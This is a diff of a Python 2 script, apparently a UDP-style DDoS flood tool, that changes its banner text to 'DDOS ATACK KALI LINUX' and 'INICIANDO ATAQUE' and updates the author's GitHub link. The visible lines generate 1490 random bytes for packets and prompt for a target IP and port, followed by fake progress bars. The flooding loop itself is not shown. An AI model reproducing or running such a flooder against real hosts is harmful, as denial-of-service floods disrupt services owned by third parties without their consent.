@@ -18,17 +18,17 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet DDOS ATACK KALI LINUX")
 print
 print "Author   : Evan01"
 print "You Tube : https://www.youtube.com/channel/UCkpaIqn_gz4xIT9PkASiRdg"
-print "github   : https://github.com/bythelink89/"
+print "github   : https://github.com/bythelink89/DDOS-ATACK-KALI-"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet INICIANDO ATAQUE ")
 print "[                    ] 0% "
 time.sleep(5)
 print "[===                 ] 14%"
